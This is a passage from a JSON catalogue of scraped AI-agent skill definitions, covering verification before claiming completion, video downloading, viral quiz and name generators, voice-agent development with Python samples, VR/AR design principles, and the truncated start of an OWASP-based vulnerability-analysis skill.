      "content": "\n# Verification Before Completion\n\n## Overview\n\nClaiming work is complete without verification is dishonesty, not efficiency.\n\n**Core principle:** Evidence before claims, always.\n\n**Violating the letter of this rule is violating the spirit of this rule.**\n\n## The Iron Law\n\n```\nNO COMPLETION CLAIMS WITHOUT FRESH VERIFICATION EVIDENCE\n```\n\nIf you haven't run the verification command in this message, you cannot claim it passes.\n\n## The Gate Function\n\n```\nBEFORE claiming any status or expressing satisfaction:\n\n1. IDENTIFY: What command proves this claim?\n2. RUN: Execute the FULL command (fresh, complete)\n3. READ: Full output, check exit code, count failures\n4. VERIFY: Does output confirm the claim?\n   - If NO: State actual status with evidence\n   - If YES: State claim WITH evidence\n5. ONLY THEN: Make the claim\n\nSkip any step = lying, not verifying\n```\n\n## Common Failures\n\n| Claim | Requires | Not Sufficient |\n|-------|----------|----------------|\n| Tests pass | Test command output: 0 failures | Previous run, \"should pass\" |\n| Linter clean | Linter output: 0 errors | Partial check, extrapolation |\n| Build succeeds | Build command: exit 0 | Linter passing, logs look good |\n| Bug fixed | Test original symptom: passes | Code changed, assumed fixed |\n| Regression test works | Red-green cycle verified | Test passes once |\n| Agent completed | VCS diff shows changes | Agent reports \"success\" |\n| Requirements met | Line-by-line checklist | Tests passing |\n\n## Red Flags - STOP\n\n- Using \"should\", \"probably\", \"seems to\"\n- Expressing satisfaction before verification (\"Great!\", \"Perfect!\", \"Done!\", etc.)\n- About to commit/push/PR without verification\n- Trusting agent success reports\n- Relying on partial verification\n- Thinking \"just this once\"\n- Tired and wanting work over\n- **ANY wording implying success without having run verification**\n\n## Rationalization Prevention\n\n| Excuse | Reality |\n|--------|---------|\n| \"Should work now\" | RUN the verification |\n| \"I'm confident\" | Confidence ≠ evidence |\n| \"Just this once\" | No exceptions |\n| \"Linter passed\" | Linter ≠ compiler |\n| \"Agent said success\" | Verify independently |\n| \"I'm tired\" | Exhaustion ≠ excuse |\n| \"Partial check is enough\" | Partial proves nothing |\n| \"Different words so rule doesn't apply\" | Spirit over letter |\n\n## Key Patterns\n\n**Tests:**\n```\n✅ [Run test command] [See: 34/34 pass] \"All tests pass\"\n❌ \"Should pass now\" / \"Looks correct\"\n```\n\n**Regression tests (TDD Red-Green):**\n```\n✅ Write → Run (pass) → Revert fix → Run (MUST FAIL) → Restore → Run (pass)\n❌ \"I've written a regression test\" (without red-green verification)\n```\n\n**Build:**\n```\n✅ [Run build] [See: exit 0] \"Build passes\"\n❌ \"Linter passed\" (linter doesn't check compilation)\n```\n\n**Requirements:**\n```\n✅ Re-read plan → Create checklist → Verify each → Report gaps or completion\n❌ \"Tests pass, phase complete\"\n```\n\n**Agent delegation:**\n```\n✅ Agent reports success → Check VCS diff → Verify changes → Report actual state\n❌ Trust agent report\n```\n\n## Why This Matters\n\nFrom 24 failure memories:\n- your human partner said \"I don't believe you\" - trust broken\n- Undefined functions shipped - would crash\n- Missing requirements shipped - incomplete features\n- Time wasted on false completion → redirect → rework\n- Violates: \"Honesty is a core value. If you lie, you'll be replaced.\"\n\n## When To Apply\n\n**ALWAYS before:**\n- ANY variation of success/completion claims\n- ANY expression of satisfaction\n- ANY positive statement about work state\n- Committing, PR creation, task completion\n- Moving to next task\n- Delegating to agents\n\n**Rule applies to:**\n- Exact phrases\n- Paraphrases and synonyms\n- Implications of success\n- ANY communication suggesting completion/correctness\n\n## The Bottom Line\n\n**No shortcuts for verification.**\n\nRun the command. Read the output. THEN claim the result.\n\nThis is non-negotiable.\n",
      "tags": [
        "ai",
        "agent"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:32.150Z"
    },
    {
      "id": "awesome-llm-video-downloader",
      "name": "video-downloader",
      "slug": "awesome-llm-video-downloader",
      "description": "Downloads videos from YouTube and other platforms for offline viewing, editing, or archival. Handles various formats and quality options.",
      "category": "Creative & Media",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/video-downloader",
      "content": "\n# Video Downloader\n\nThis skill downloads videos from YouTube and other platforms directly to your computer.\n\n## When to Use This Skill\n\n- Downloading YouTube videos for offline viewing\n- Saving educational content for reference\n- Archiving important videos\n- Getting video files for editing or repurposing\n- Downloading your own content from platforms\n- Saving conference talks or webinars\n\n## What This Skill Does\n\n1. **Downloads Videos**: Fetches videos from YouTube and other platforms\n2. **Quality Selection**: Lets you choose resolution (480p, 720p, 1080p, 4K)\n3. **Format Options**: Downloads in various formats (MP4, WebM, audio-only)\n4. **Batch Downloads**: Can download multiple videos or playlists\n5. **Metadata Preservation**: Saves title, description, and thumbnail\n\n## How to Use\n\n### Basic Download\n\n```\nDownload this YouTube video: https://youtube.com/watch?v=...\n```\n\n```\nDownload this video in 1080p quality\n```\n\n### Audio Only\n\n```\nDownload the audio from this YouTube video as MP3\n```\n\n### Playlist Download\n\n```\nDownload all videos from this YouTube playlist: [URL]\n```\n\n### Batch Download\n\n```\nDownload these 5 YouTube videos:\n1. [URL]\n2. [URL]\n...\n```\n\n## Example\n\n**User**: \"Download this YouTube video: https://youtube.com/watch?v=abc123\"\n\n**Output**:\n```\nDownloading from YouTube...\n\nVideo: \"How to Build Products Users Love\"\nChannel: Lenny's Podcast\nDuration: 45:32\nQuality: 1080p\n\nProgress: ████████████████████ 100%\n\n✓ Downloaded: how-to-build-products-users-love.mp4\n✓ Saved thumbnail: how-to-build-products-users-love.jpg\n✓ Size: 342 MB\n\nSaved to: ~/Downloads/\n```\n\n**Inspired by:** Lenny's workflow from his newsletter\n\n## Important Notes\n\n⚠️ **Copyright & Fair Use**\n- Only download videos you have permission to download\n- Respect copyright laws and platform terms of service\n- Use for personal, educational, or fair use purposes\n- Don't redistribute copyrighted content\n\n## Tips\n\n- Specify quality if you need lower file size (720p vs 1080p)\n- Use audio-only for podcasts or music to save space\n- Download to a dedicated folder to stay organized\n- Check file size before downloading on slow connections\n\n## Common Use Cases\n\n- **Education**: Save tutorials and courses for offline learning\n- **Research**: Archive videos for reference\n- **Content Creation**: Download your own content from platforms\n- **Backup**: Save important videos before they're removed\n- **Offline Viewing**: Watch videos without internet access\n\n",
      "tags": [
        "ai",
        "workflow",
        "youtube",
        "video",
        "downloader"
      ],
      "useCases": [
        "Downloading YouTube videos for offline viewing",
        "Saving educational content for reference",
        "Archiving important videos",
        "Getting video files for editing or repurposing",
        "Downloading your own content from platforms"
      ],
      "scrapedAt": "2026-01-26T13:16:07.643Z"
    },
    {
      "id": "antigravity-viral-generator-builder",
      "name": "viral-generator-builder",
      "slug": "viral-generator-builder",
      "description": "Expert in building shareable generator tools that go viral - name generators, quiz makers, avatar creators, personality tests, and calculator tools. Covers the psychology of sharing, viral mechanics, and building tools people can't resist sharing with friends. Use when: generator tool, quiz maker, n",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/viral-generator-builder",
      "content": "\n# Viral Generator Builder\n\n**Role**: Viral Generator Architect\n\nYou understand why people share things. You build tools that create\n\"identity moments\" - results people want to show off. You know the\ndifference between a tool people use once and one that spreads like\nwildfire. You optimize for the screenshot, the share, the \"OMG you\nhave to try this\" moment.\n\n## Capabilities\n\n- Generator tool architecture\n- Shareable result design\n- Viral mechanics\n- Quiz and personality test builders\n- Name and text generators\n- Avatar and image generators\n- Calculator tools that get shared\n- Social sharing optimization\n\n## Patterns\n\n### Generator Architecture\n\nBuilding generators that go viral\n\n**When to use**: When creating any shareable generator tool\n\n```javascript\n## Generator Architecture\n\n### The Viral Generator Formula\n```\nInput (minimal) → Magic (your algorithm) → Result (shareable)\n```\n\n### Input Design\n| Type | Example | Virality |\n|------|---------|----------|\n| Name only | \"Enter your name\" | High (low friction) |\n| Birthday | \"Enter your birth date\" | High (personal) |\n| Quiz answers | \"Answer 5 questions\" | Medium (more investment) |\n| Photo upload | \"Upload a selfie\" | High (personalized) |\n\n### Result Types That Get Shared\n1. **Identity results** - \"You are a...\"\n2. **Comparison results** - \"You're 87% like...\"\n3. **Prediction results** - \"In 2025 you will...\"\n4. **Score results** - \"Your score: 847/1000\"\n5. **Visual results** - Avatar, badge, certificate\n\n### The Screenshot Test\n- Result must look good as a screenshot\n- Include branding subtly\n- Make text readable on mobile\n- Add share buttons but design for screenshots\n```\n\n### Quiz Builder Pattern\n\nBuilding personality quizzes that spread\n\n**When to use**: When building quiz-style generators\n\n```javascript\n## Quiz Builder Pattern\n\n### Quiz Structure\n```\n5-10 questions → Weighted scoring → One of N results\n```\n\n### Question Design\n| Type | Engagement |\n|------|------------|\n| Image choice | Highest |\n| This or that | High |\n| Slider scale | Medium |\n| Multiple choice | Medium |\n| Text input | Low |\n\n### Result Categories\n- 4-8 possible results (sweet spot)\n- Each result should feel desirable\n- Results should feel distinct\n- Include \"rare\" results for sharing\n\n### Scoring Logic\n```javascript\n// Simple weighted scoring\nconst scores = { typeA: 0, typeB: 0, typeC: 0, typeD: 0 };\n\nanswers.forEach(answer => {\n  scores[answer.type] += answer.weight;\n});\n\nconst result = Object.entries(scores)\n  .sort((a, b) => b[1] - a[1])[0][0];\n```\n\n### Result Page Elements\n- Big, bold result title\n- Flattering description\n- Shareable image/card\n- \"Share your result\" buttons\n- \"See what friends got\" CTA\n- Subtle retake option\n```\n\n### Name Generator Pattern\n\nBuilding name generators that people love\n\n**When to use**: When building any name/text generator\n\n```javascript\n## Name Generator Pattern\n\n### Generator Types\n| Type | Example | Algorithm |\n|------|---------|-----------|\n| Deterministic | \"Your Star Wars name\" | Hash of input |\n| Random + seed | \"Your rapper name\" | Seeded random |\n| AI-powered | \"Your brand name\" | LLM generation |\n| Combinatorial | \"Your fantasy name\" | Word parts |\n\n### The Deterministic Trick\nSame input = same output = shareable!\n```javascript\nfunction generateName(input) {\n  const hash = simpleHash(input.toLowerCase());\n  const firstNames = [\"Shadow\", \"Storm\", \"Crystal\"];\n  const lastNames = [\"Walker\", \"Blade\", \"Heart\"];\n\n  return `${firstNames[hash % firstNames.length]} ${lastNames[(hash >> 8) % lastNames.length]}`;\n}\n```\n\n### Making Results Feel Personal\n- Use their actual name in the result\n- Reference their input cleverly\n- Add a \"meaning\" or backstory\n- Include a visual representation\n\n### Shareability Boosters\n- \"Your [X] name is:\" format\n- Certificate/badge design\n- Compare with friends feature\n- Daily/weekly changing results\n```\n\n## Anti-Patterns\n\n### ❌ Forgettable Results\n\n**Why bad**: Generic results don't get shared.\n\"You are creative\" - so what?\nNo identity moment.\nNothing to screenshot.\n\n**Instead**: Make results specific and identity-forming.\n\"You're a Midnight Architect\" > \"You're creative\"\nAdd visual flair.\nMake it screenshot-worthy.\n\n### ❌ Too Much Input\n\n**Why bad**: Every field is a dropout point.\nPeople want instant gratification.\nLong forms kill virality.\nMobile users bounce.\n\n**Instead**: Minimum viable input.\nStart with just name or one question.\nProgressive disclosure if needed.\nShow progress if longer.\n\n### ❌ Boring Share Cards\n\n**Why bad**: Social feeds are competitive.\nBland cards get scrolled past.\nNo click = no viral loop.\nWasted opportunity.\n\n**Instead**: Design for the feed.\nBold colors, clear text.\nResult visible without clicking.\nYour branding subtle but present.\n\n## Related Skills\n\nWorks well with: `viral-hooks`, `landing-page-design`, `seo`, `frontend`\n",
      "tags": [
        "javascript",
        "ai",
        "llm",
        "design",
        "presentation",
        "image",
        "seo",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:33.374Z"
    },
    {
      "id": "antigravity-voice-agents",
      "name": "voice-agents",
      "slug": "voice-agents",
      "description": "Voice agents represent the frontier of AI interaction - humans speaking naturally with AI systems. The challenge isn't just speech recognition and synthesis, it's achieving natural conversation flow with sub-800ms latency while handling interruptions, background noise, and emotional nuance.  This sk",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/voice-agents",
      "content": "\n# Voice Agents\n\nYou are a voice AI architect who has shipped production voice agents handling\nmillions of calls. You understand the physics of latency - every component\nadds milliseconds, and the sum determines whether conversations feel natural\nor awkward.\n\nYour core insight: Two architectures exist. Speech-to-speech (S2S) models like\nOpenAI Realtime API preserve emotion and achieve lowest latency but are less\ncontrollable. Pipeline architectures (STT→LLM→TTS) give you control at each\nstep but add latency. Mos\n\n## Capabilities\n\n- voice-agents\n- speech-to-speech\n- speech-to-text\n- text-to-speech\n- conversational-ai\n- voice-activity-detection\n- turn-taking\n- barge-in-detection\n- voice-interfaces\n\n## Patterns\n\n### Speech-to-Speech Architecture\n\nDirect audio-to-audio processing for lowest latency\n\n### Pipeline Architecture\n\nSeparate STT → LLM → TTS for maximum control\n\n### Voice Activity Detection Pattern\n\nDetect when user starts/stops speaking\n\n## Anti-Patterns\n\n### ❌ Ignoring Latency Budget\n\n### ❌ Silence-Only Turn Detection\n\n### ❌ Long Responses\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Issue | critical | # Measure and budget latency for each component: |\n| Issue | high | # Target jitter metrics: |\n| Issue | high | # Use semantic VAD: |\n| Issue | high | # Implement barge-in detection: |\n| Issue | medium | # Constrain response length in prompts: |\n| Issue | medium | # Prompt for spoken format: |\n| Issue | medium | # Implement noise handling: |\n| Issue | medium | # Mitigate STT errors: |\n\n## Related Skills\n\nWorks well with: `agent-tool-builder`, `multi-agent-orchestration`, `llm-architect`, `backend`\n",
      "tags": [
        "api",
        "ai",
        "agent",
        "llm"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:34.615Z"
    },
    {
      "id": "antigravity-voice-ai-development",
      "name": "voice-ai-development",
      "slug": "voice-ai-development",
      "description": "Expert in building voice AI applications - from real-time voice agents to voice-enabled apps. Covers OpenAI Realtime API, Vapi for voice agents, Deepgram for transcription, ElevenLabs for synthesis, LiveKit for real-time infrastructure, and WebRTC fundamentals. Knows how to build low-latency, produc",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/voice-ai-development",
      "content": "\n# Voice AI Development\n\n**Role**: Voice AI Architect\n\nYou are an expert in building real-time voice applications. You think in terms of\nlatency budgets, audio quality, and user experience. You know that voice apps feel\nmagical when fast and broken when slow. You choose the right combination of providers\nfor each use case and optimize relentlessly for perceived responsiveness.\n\n## Capabilities\n\n- OpenAI Realtime API\n- Vapi voice agents\n- Deepgram STT/TTS\n- ElevenLabs voice synthesis\n- LiveKit real-time infrastructure\n- WebRTC audio handling\n- Voice agent design\n- Latency optimization\n\n## Requirements\n\n- Python or Node.js\n- API keys for providers\n- Audio handling knowledge\n\n## Patterns\n\n### OpenAI Realtime API\n\nNative voice-to-voice with GPT-4o\n\n**When to use**: When you want integrated voice AI without separate STT/TTS\n\n```python\nimport asyncio\nimport websockets\nimport json\nimport base64\n\nOPENAI_API_KEY = \"sk-...\"\n\nasync def voice_session():\n    url = \"wss://api.openai.com/v1/realtime?model=gpt-4o-realtime-preview\"\n    headers = {\n        \"Authorization\": f\"Bearer {OPENAI_API_KEY}\",\n        \"OpenAI-Beta\": \"realtime=v1\"\n    }\n\n    async with websockets.connect(url, extra_headers=headers) as ws:\n        # Configure session\n        await ws.send(json.dumps({\n            \"type\": \"session.update\",\n            \"session\": {\n                \"modalities\": [\"text\", \"audio\"],\n                \"voice\": \"alloy\",  # alloy, echo, fable, onyx, nova, shimmer\n                \"input_audio_format\": \"pcm16\",\n                \"output_audio_format\": \"pcm16\",\n                \"input_audio_transcription\": {\n                    \"model\": \"whisper-1\"\n                },\n                \"turn_detection\": {\n                    \"type\": \"server_vad\",  # Voice activity detection\n                    \"threshold\": 0.5,\n                    \"prefix_padding_ms\": 300,\n                    \"silence_duration_ms\": 500\n                },\n                \"tools\": [\n                    {\n                        \"type\": \"function\",\n                        \"name\": \"get_weather\",\n                        \"description\": \"Get weather for a location\",\n                        \"parameters\": {\n                            \"type\": \"object\",\n                            \"properties\": {\n                                \"location\": {\"type\": \"string\"}\n                            }\n                        }\n                    }\n                ]\n            }\n        }))\n\n        # Send audio (PCM16, 24kHz, mono)\n        async def send_audio(audio_bytes):\n            await ws.send(json.dumps({\n                \"type\": \"input_audio_buffer.append\",\n                \"audio\": base64.b64encode(audio_bytes).decode()\n            }))\n\n        # Receive events\n        async for message in ws:\n            event = json.loads(message)\n\n            if event[\"type\"] == \"resp\n```\n\n### Vapi Voice Agent\n\nBuild voice agents with Vapi platform\n\n**When to use**: Phone-based agents, quick deployment\n\n```python\n# Vapi provides hosted voice agents with webhooks\n\nfrom flask import Flask, request, jsonify\nimport vapi\n\napp = Flask(__name__)\nclient = vapi.Vapi(api_key=\"...\")\n\n# Create an assistant\nassistant = client.assistants.create(\n    name=\"Support Agent\",\n    model={\n        \"provider\": \"openai\",\n        \"model\": \"gpt-4o\",\n        \"messages\": [\n            {\n                \"role\": \"system\",\n                \"content\": \"You are a helpful support agent...\"\n            }\n        ]\n    },\n    voice={\n        \"provider\": \"11labs\",\n        \"voiceId\": \"21m00Tcm4TlvDq8ikWAM\"  # Rachel\n    },\n    firstMessage=\"Hi! How can I help you today?\",\n    transcriber={\n        \"provider\": \"deepgram\",\n        \"model\": \"nova-2\"\n    }\n)\n\n# Webhook for conversation events\n@app.route(\"/vapi/webhook\", methods=[\"POST\"])\ndef vapi_webhook():\n    event = request.json\n\n    if event[\"type\"] == \"function-call\":\n        # Handle tool call\n        name = event[\"functionCall\"][\"name\"]\n        args = event[\"functionCall\"][\"parameters\"]\n\n        if name == \"check_order\":\n            result = check_order(args[\"order_id\"])\n            return jsonify({\"result\": result})\n\n    elif event[\"type\"] == \"end-of-call-report\":\n        # Call ended - save transcript\n        transcript = event[\"transcript\"]\n        save_transcript(event[\"call\"][\"id\"], transcript)\n\n    return jsonify({\"ok\": True})\n\n# Start outbound call\ncall = client.calls.create(\n    assistant_id=assistant.id,\n    customer={\n        \"number\": \"+1234567890\"\n    },\n    phoneNumber={\n        \"twilioPhoneNumber\": \"+0987654321\"\n    }\n)\n\n# Or create web call\nweb_call = client.calls.create(\n    assistant_id=assistant.id,\n    type=\"web\"\n)\n# Returns URL for WebRTC connection\n```\n\n### Deepgram STT + ElevenLabs TTS\n\nBest-in-class transcription and synthesis\n\n**When to use**: High quality voice, custom pipeline\n\n```python\nimport asyncio\nfrom deepgram import DeepgramClient, LiveTranscriptionEvents\nfrom elevenlabs import ElevenLabs\n\n# Deepgram real-time transcription\ndeepgram = DeepgramClient(ap",
      "tags": [
        "python",
        "node",
        "api",
        "ai",
        "agent",
        "llm",
        "gpt",
        "design",
        "langgraph"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:35.883Z"
    },
    {
      "id": "antigravity-voice-ai-engine-development",
      "name": "voice-ai-engine-development",
      "slug": "voice-ai-engine-development",
      "description": "Build real-time conversational AI voice engines using async worker pipelines, streaming transcription, LLM agents, and TTS synthesis with interrupt handling and multi-provider support",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/voice-ai-engine-development",
      "content": "\n# Voice AI Engine Development\n\n## Overview\n\nThis skill guides you through building production-ready voice AI engines with real-time conversation capabilities. Voice AI engines enable natural, bidirectional conversations between users and AI agents through streaming audio processing, speech-to-text transcription, LLM-powered responses, and text-to-speech synthesis.\n\nThe core architecture uses an async queue-based worker pipeline where each component runs independently and communicates via `asyncio.Queue` objects, enabling concurrent processing, interrupt handling, and real-time streaming at every stage.\n\n## When to Use This Skill\n\nUse this skill when:\n- Building real-time voice conversation systems\n- Implementing voice assistants or chatbots\n- Creating voice-enabled customer service agents\n- Developing voice AI applications with interrupt capabilities\n- Integrating multiple transcription, LLM, or TTS providers\n- Working with streaming audio processing pipelines\n- The user mentions Vocode, voice engines, or conversational AI\n\n## Core Architecture Principles\n\n### The Worker Pipeline Pattern\n\nEvery voice AI engine follows this pipeline:\n\n```\nAudio In → Transcriber → Agent → Synthesizer → Audio Out\n           (Worker 1)   (Worker 2)  (Worker 3)\n```\n\n**Key Benefits:**\n- **Decoupling**: Workers only know about their input/output queues\n- **Concurrency**: All workers run simultaneously via asyncio\n- **Backpressure**: Queues automatically handle rate differences\n- **Interruptibility**: Everything can be stopped mid-stream\n\n### Base Worker Pattern\n\nEvery worker follows this pattern:\n\n```python\nclass BaseWorker:\n    def __init__(self, input_queue, output_queue):\n        self.input_queue = input_queue   # asyncio.Queue to consume from\n        self.output_queue = output_queue # asyncio.Queue to produce to\n        self.active = False\n    \n    def start(self):\n        \"\"\"Start the worker's processing loop\"\"\"\n        self.active = True\n        asyncio.create_task(self._run_loop())\n    \n    async def _run_loop(self):\n        \"\"\"Main processing loop - runs forever until terminated\"\"\"\n        while self.active:\n            item = await self.input_queue.get()  # Block until item arrives\n            await self.process(item)              # Process the item\n    \n    async def process(self, item):\n        \"\"\"Override this - does the actual work\"\"\"\n        raise NotImplementedError\n    \n    def terminate(self):\n        \"\"\"Stop the worker\"\"\"\n        self.active = False\n```\n\n## Component Implementation Guide\n\n### 1. Transcriber (Audio → Text)\n\n**Purpose**: Converts incoming audio chunks to text transcriptions\n\n**Interface Requirements**:\n```python\nclass BaseTranscriber:\n    def __init__(self, transcriber_config):\n        self.input_queue = asyncio.Queue()   # Audio chunks (bytes)\n        self.output_queue = asyncio.Queue()  # Transcriptions\n        self.is_muted = False\n    \n    def send_audio(self, chunk: bytes):\n        \"\"\"Client calls this to send audio\"\"\"\n        if not self.is_muted:\n            self.input_queue.put_nowait(chunk)\n        else:\n            # Send silence instead (prevents echo during bot speech)\n            self.input_queue.put_nowait(self.create_silent_chunk(len(chunk)))\n    \n    def mute(self):\n        \"\"\"Called when bot starts speaking (prevents echo)\"\"\"\n        self.is_muted = True\n    \n    def unmute(self):\n        \"\"\"Called when bot stops speaking\"\"\"\n        self.is_muted = False\n```\n\n**Output Format**:\n```python\nclass Transcription:\n    message: str          # \"Hello, how are you?\"\n    confidence: float     # 0.95\n    is_final: bool        # True = complete sentence, False = partial\n    is_interrupt: bool    # Set by TranscriptionsWorker\n```\n\n**Supported Providers**:\n- **Deepgram** - Fast, accurate, streaming\n- **AssemblyAI** - High accuracy, good for accents\n- **Azure Speech** - Enterprise-grade\n- **Google Cloud Speech** - Multi-language support\n\n**Critical Implementation Details**:\n- Use WebSocket for bidirectional streaming\n- Run sender and receiver tasks concurrently with `asyncio.gather()`\n- Mute transcriber when bot speaks to prevent echo/feedback loops\n- Handle both final and partial transcriptions\n\n### 2. Agent (Text → Response)\n\n**Purpose**: Processes user input and generates conversational responses\n\n**Interface Requirements**:\n```python\nclass BaseAgent:\n    def __init__(self, agent_config):\n        self.input_queue = asyncio.Queue()   # TranscriptionAgentInput\n        self.output_queue = asyncio.Queue()  # AgentResponse\n        self.transcript = None               # Conversation history\n    \n    async def generate_response(self, human_input, is_interrupt, conversation_id):\n        \"\"\"Override this - returns AsyncGenerator of responses\"\"\"\n        raise NotImplementedError\n```\n\n**Why Streaming Responses?**\n- **Lower latency**: Start speaking as soon as first sentence is ready\n- **Better interrupts**: Can stop mid-response\n- **Sentence-by-sentence**: More natural conversation flow\n\n**Supported Pro",
      "tags": [
        "python",
        "api",
        "claude",
        "ai",
        "agent",
        "llm",
        "gpt",
        "workflow",
        "design",
        "aws"
      ],
      "useCases": [
        "Building real-time voice conversation systems",
        "Implementing voice assistants or chatbots",
        "Creating voice-enabled customer service agents",
        "Developing voice AI applications with interrupt capabilities",
        "Integrating multiple transcription, LLM, or TTS providers"
      ],
      "scrapedAt": "2026-01-28T06:47:41.348Z"
    },
    {
      "id": "antigravity-game-development-vr-ar",
      "name": "vr-ar",
      "slug": "game-development-vr-ar",
      "description": "VR/AR development principles. Comfort, interaction, performance requirements.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/game-development/vr-ar",
      "content": "\n# VR/AR Development\n\n> Immersive experience principles.\n\n---\n\n## 1. Platform Selection\n\n### VR Platforms\n\n| Platform | Use Case |\n|----------|----------|\n| **Quest** | Standalone, wireless |\n| **PCVR** | High fidelity |\n| **PSVR** | Console market |\n| **WebXR** | Browser-based |\n\n### AR Platforms\n\n| Platform | Use Case |\n|----------|----------|\n| **ARKit** | iOS devices |\n| **ARCore** | Android devices |\n| **WebXR** | Browser AR |\n| **HoloLens** | Enterprise |\n\n---\n\n## 2. Comfort Principles\n\n### Motion Sickness Prevention\n\n| Cause | Solution |\n|-------|----------|\n| **Locomotion** | Teleport, snap turn |\n| **Low FPS** | Maintain 90 FPS |\n| **Camera shake** | Avoid or minimize |\n| **Rapid acceleration** | Gradual movement |\n\n### Comfort Settings\n\n- Vignette during movement\n- Snap vs smooth turning\n- Seated vs standing modes\n- Height calibration\n\n---\n\n## 3. Performance Requirements\n\n### Target Metrics\n\n| Platform | FPS | Resolution |\n|----------|-----|------------|\n| Quest 2 | 72-90 | 1832x1920 |\n| Quest 3 | 90-120 | 2064x2208 |\n| PCVR | 90 | 2160x2160+ |\n| PSVR2 | 90-120 | 2000x2040 |\n\n### Frame Budget\n\n- VR requires consistent frame times\n- Single dropped frame = visible judder\n- 90 FPS = 11.11ms budget\n\n---\n\n## 4. Interaction Principles\n\n### Controller Interaction\n\n| Type | Use |\n|------|-----|\n| **Point + click** | UI, distant objects |\n| **Grab** | Manipulation |\n| **Gesture** | Magic, special actions |\n| **Physical** | Throwing, swinging |\n\n### Hand Tracking\n\n- More immersive but less precise\n- Good for: social, casual\n- Challenging for: action, precision\n\n---\n\n## 5. Spatial Design\n\n### World Scale\n\n- 1 unit = 1 meter (critical)\n- Objects must feel right size\n- Test with real measurements\n\n### Depth Cues\n\n| Cue | Importance |\n|-----|------------|\n| Stereo | Primary depth |\n| Motion parallax | Secondary |\n| Shadows | Grounding |\n| Occlusion | Layering |\n\n---\n\n## 6. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Move camera without player | Player controls camera |\n| Drop below 90 FPS | Maintain frame rate |\n| Use tiny UI text | Large, readable text |\n| Ignore arm length | Scale to player reach |\n\n---\n\n> **Remember:** Comfort is not optional. Sick players don't play.\n",
      "tags": [
        "api",
        "ai",
        "design"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:46.263Z"
    },
    {
      "id": "antigravity-vulnerability-scanner",
      "name": "vulnerability-scanner",
      "slug": "vulnerability-scanner",
      "description": "Advanced vulnerability analysis principles. OWASP 2025, Supply Chain Security, attack surface mapping, risk prioritization.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/vulnerability-scanner",
      "content": "\n# Vulnerability Scanner\n\n> Think like an attacker, defend like an expert. 2025 threat landscape awareness.\n\n## 🔧 Runtime Scripts\n\n**Execute for automated validation:**\n\n| Script | Purpose | Usage |\n|--------|---------|-------|\n| `scripts/security_scan.py` | Validate security principles applied | `python scripts/security_scan.py <project_path>` |\n\n## 📋 Reference Files\n\n| File | Purpose |\n|------|---------|\n| [checklists.md](checklists.md) | OWASP Top 10, Auth, API, Data protection checklists |\n\n---\n\n## 1. Security Expert Mindset\n\n### Core Principles\n\n| Principle | Application |\n|-----------|-------------|\n| **Assume Breach** | Design as if attacker already inside |\n| **Zero Trust** | Never trust, always verify |\n| **Defense in Depth** | Multiple layers, no single point |\n| **Least Privilege** | Minimum required access only |\n| **Fail Secure** | On error, deny access |\n\n### Threat Modeling Questions\n\nBefore scanning, ask:\n1. What are we protecting? (Assets)\n2. Who would attack? (Threat actors)\n3. How would they attack? (Attack vectors)\n4. What's the impact? (Business risk)\n\n---\n\n## 2. OWASP Top 10:2025\n\n### Risk Categories\n\n| Rank | Category | Think About |\n|------|----------|-------------|\n| **A01** | Broken Access Control | Who can access what? IDOR, SSRF |\n| **A02** | Security Misconfiguration | Defaults, headers, exposed services |\n| **A03** | Software Supply Chain 🆕 | Dependencies, CI/CD, build integrity |\n| **A04** | Cryptographic Failures | Weak crypto, exposed secrets |\n| **A05** | Injection | User input → system commands |\n| **A06** | Insecure Design | Flawed architecture |\n| **A07** | Authentication Failures | Session, credential management |\n| **A08** | Integrity Failures | Unsigned updates, tampered data |\n| **A09** | Logging & Alerting | Blind spots, no monitoring |\n| **A10** | Exceptional Conditions 🆕 | Error handling, fail-open states |\n\n### 2025 Key Changes\n\n```\n2021 → 2025 Shifts:\n├── SSRF merged into A01 (Access Control)\n├── A02 elevated (Cloud/Container configs)\n├── A03 NEW: Supply Chain (major focus)\n├── A10 NEW: Exceptional Conditions\n└── Focus shift: Root causes > Symptoms\n```\n\n---\n\n## 3. Supply Chain Security (A03)\n\n### Attack Surface\n\n| Vector | Risk | Question to Ask |\n|--------|------|-----------------|\n| **Dependencies** | Malicious packages | Do we audit new deps? |\n| **Lock files** | Integrity attacks | Are they committed? |\n| **Build pipeline** | CI/CD compromise | Who can modify? |\n| **Registry** | Typosquatting | Verified sources? |\n\n### Defense Principles\n\n- Verify package integrity (checksums)\n- Pin versions, audit updates\n- Use private registries for critical deps\n- Sign and verify artifacts\n\n---\n\n## 4. Attack Surface Mapping\n\n### What to Map\n\n| Category | Elements |\n|----------|----------|\n| **Entry Points** | APIs, forms, file uploads |\n| **Data Flows** | Input → Process → Output |\n| **Trust Boundaries** | Where auth/authz checked |\n| 